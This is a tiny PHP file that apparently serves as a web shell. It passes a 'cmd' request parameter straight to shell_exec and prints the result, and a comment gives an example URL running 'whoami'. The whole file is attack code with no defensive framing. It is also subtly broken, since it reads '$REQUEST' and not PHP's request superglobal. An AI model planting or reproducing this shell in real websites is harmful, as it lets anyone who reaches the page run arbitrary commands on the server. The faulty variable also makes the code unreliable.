<?php
    // http://localhost/shellExec.php?cmd=whoami
    echo "<pre>" . shell_exec($REQUEST['cmd']) . "</pre>";
?>
